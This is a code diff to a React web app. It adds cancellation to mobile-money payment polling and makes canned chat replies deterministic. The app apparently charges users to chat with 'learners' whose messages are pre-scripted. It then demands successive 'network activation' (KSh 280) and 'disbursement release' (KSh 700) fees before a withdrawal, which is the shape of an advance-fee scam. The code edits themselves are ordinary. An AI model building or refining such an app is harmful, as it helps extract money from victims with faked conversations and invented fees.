@@ -33,9 +33,10 @@ const REPLIES = [
 ];
 
 /* ═══════════════════ POLLING HELPER ═══════════════════ */
-async function pollPaymentStatus(transactionId, { intervalMs = 3000, maxWaitMs = 90000 } = {}) {
+async function pollPaymentStatus(transactionId, { intervalMs = 3000, maxWaitMs = 90000, signal } = {}) {
   const start = Date.now();
   while (Date.now() - start < maxWaitMs) {
+    if (signal?.aborted) return 'cancelled';
     try {
       const r = await fetch(`/api/check-payment?transactionId=${transactionId}`);
       const d = await r.json();
@@ -43,6 +44,7 @@ async function pollPaymentStatus(transactionId, { intervalMs = 3000, maxWaitMs =
       if (d.status === 'FAILED') return 'failed';
     } catch (_) { /* keep polling */ }
     await new Promise(res => setTimeout(res, intervalMs));
+    if (signal?.aborted) return 'cancelled';
   }
   return 'timeout';
 }
@@ -65,6 +67,7 @@ function AppProvider({ children }) {
   const [actModalOpen, setActModalOpen] = useState(false);
   const [stkState, setStkState] = useState(null);
   const [stkPhone, setStkPhone] = useState('');
+  const [stkCancelFn, setStkCancelFn] = useState(null);
   const [editModalOpen, setEditModalOpen] = useState(false);
   const [mobDrawerOpen, setMobDrawerOpen] = useState(false);
   const [withdrawalStage, setWithdrawalStage] = useState(null);
@@ -88,6 +91,7 @@ function AppProvider({ children }) {
       ledger, setLedger, profile, setProfile, activeLearner, setActiveLearner,
       activeCount, setActiveCount, actModalOpen, setActModalOpen,
       stkState, setStkState, stkPhone, setStkPhone,
+      stkCancelFn, setStkCancelFn,
       editModalOpen, setEditModalOpen, mobDrawerOpen, setMobDrawerOpen,
       endChat, activateChats,
       withdrawalStage, setWithdrawalStage, withdrawalPhone, setWithdrawalPhone,
@@ -257,7 +261,7 @@ function Dashboard() {
 
 /* ═══════════════════ ACTIVATION MODAL (Paylor) ═══════════════════ */
 function ActivationModal() {
-  const { actModalOpen, setActModalOpen, setStkState, setStkPhone } = useApp();
+  const { actModalOpen, setActModalOpen, setStkState, setStkPhone, setStkCancelFn } = useApp();
   const [phone, setPhone] = useState('');
   const [phoneErr, setPhoneErr] = useState('');
   const [alert, setAlert] = useState(null);
@@ -294,8 +298,15 @@ function ActivationModal() {
         setStkPhone(norm);
         close();
         setStkState('waiting');
-        const result = await pollPaymentStatus(data.transactionId);
+
+        const controller = new AbortController();
+        setStkCancelFn(() => () => controller.abort());
+
+        const result = await pollPaymentStatus(data.transactionId, { signal: controller.signal });
+
+        setStkCancelFn(null);
         if (result === 'success') setStkState('success');
+        else if (result === 'cancelled') { /* overlay already closed */ }
         else setStkState('fail');
       } else {
         setAlert({ type: 'error', msg: data?.message || 'STK push failed. Try again.' });
@@ -336,10 +347,19 @@ function ActivationModal() {
 
 /* ═══════════════════ STK OVERLAY ═══════════════════ */
 function StkOverlay() {
-  const { stkState, setStkState, stkPhone, activateChats } = useApp();
+  const { stkState, setStkState, stkPhone, activateChats, stkCancelFn, setStkCancelFn } = useApp();
   if (!stkState) return null;
+
   const close = () => setStkState(null);
+
+  const onCancel = () => {
+    if (stkCancelFn) stkCancelFn();
+    setStkCancelFn(null);
+    setStkState(null);
+  };
+
   const onSuccess = () => { activateChats(); setStkState(null); };
+
   return (
     <div className="stk-ov open">
       <div className="stk-card">
@@ -355,7 +375,7 @@ function StkOverlay() {
           <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, fontSize: '.82rem', color: 'var(--tm)', marginBottom: 6 }}>
             <div className="spin" /> Waiting for payment confirmation...
           </div>
-          <button className="stk-cancel-link" onClick={close}>Cancel</button>
+          <button className="stk-cancel-link" onClick={onCancel}>Cancel</button>
         </>)}
         {stkState === 'success' && (<>
           <div className="stk-success-ico"><CheckCircle size={28} style={{ color: 'var(--green)' }} /></div>
@@ -381,6 +401,7 @@ function Chat() {
   const [messages, setMessages] = useState([]);
   const [input, setInput] = useState('');
   const chatIdx = useRef(0);
+  const replyIdxRef = useRef(0);
   const intervalRef = useRef(null);
   const msgsRef = useRef(null);
   const learner = LEARNERS[activeLearner];
@@ -394,7 +415,7 @@ function Chat() {
 
   useEffect(() => {
     if (!learner) return;
-    setMessages([]); chatIdx.current = 0;
+    setMessages([]); chatIdx.current = 0; replyIdxRef.current = 0;
     const scripts = CHAT_SCRIPTS[activeLearner] || CHAT_SCRIPTS[10];
     const t = setTimeout(() => { pushMsg(scripts[0], 'them'); chatIdx.current = 1; }, 800);
     intervalRef.current = setInterval(() => {
@@ -409,8 +430,11 @@ function Chat() {
     e.preventDefault();
     const txt = input.trim(); if (!txt) return;
     pushMsg(txt, 'me'); setInput('');
-    setTimeout(() => pushMsg(REPLIES[Math.floor(Math.random() * REPLIES.length)], 'them'), 1100 + Math.random() * 700);
+    const reply = REPLIES[replyIdxRef.current % REPLIES.length];
+    replyIdxRef.current++;
+    setTimeout(() => pushMsg(reply, 'them'), 1400);
   };
+
   const onEnd = () => { if (intervalRef.current) clearInterval(intervalRef.current); endChat(); };
   if (!learner) return null;
 
@@ -594,7 +618,7 @@ function EditProfileModal() {
 
 /* ═══════════════════ NETWORK ACTIVATION FEE (KSh 280) ═══════════════════ */
 function NetworkActivationFee() {
-  const { setWithdrawalStage, setWithdrawalPhone } = useApp();
+  const { setWithdrawalStage, setWithdrawalPhone, setStkCancelFn } = useApp();
   const [phone, setPhone] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
@@ -621,10 +645,16 @@ function NetworkActivationFee() {
       const data = await resp.json();
       if (!resp.ok) throw new Error(data.error || 'STK push failed');
       if (data?.transactionId) {
-        const result = await pollPaymentStatus(data.transactionId);
+        const controller = new AbortController();
+        setStkCancelFn(() => () => controller.abort());
+        const result = await pollPaymentStatus(data.transactionId, { signal: controller.signal });
+        setStkCancelFn(null);
+
         if (result === 'success') {
           setWithdrawalPhone(norm);
           setWithdrawalStage('release');
+        } else if (result === 'cancelled') {
+          // user cancelled; leave them here for a retry
         } else {
           throw new Error('Payment not confirmed. Please try again.');
         }
@@ -648,7 +678,7 @@ function NetworkActivationFee() {
 
 /* ═══════════════════ DISBURSEMENT RELEASE FEE (KSh 700) ═══════════════════ */
 function DisbursementReleaseFee() {
-  const { setWithdrawalStage, withdrawalPhone, endWithdrawal } = useApp();
+  const { setWithdrawalStage, withdrawalPhone, endWithdrawal, setStkCancelFn } = useApp();
   const [phone, setPhone] = useState(withdrawalPhone || '');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
@@ -675,8 +705,13 @@ function DisbursementReleaseFee() {
       const data = await resp.json();
       if (!resp.ok) throw new Error(data.error || 'STK push failed');
       if (data?.transactionId) {
-        const result = await pollPaymentStatus(data.transactionId);
+        const controller = new AbortController();
+        setStkCancelFn(() => () => controller.abort());
+        const result = await pollPaymentStatus(data.transactionId, { signal: controller.signal });
+        setStkCancelFn(null);
+
         if (result === 'success') setWithdrawalStage('sending');
+        else if (result === 'cancelled') { /* user cancelled; leave for retry */ }
         else throw new Error('Payment not confirmed. Please try again.');
       } else throw new Error(data?.message || 'STK push failed');
     } catch (err) { setError(err.message || 'Network error. Try again.'); }
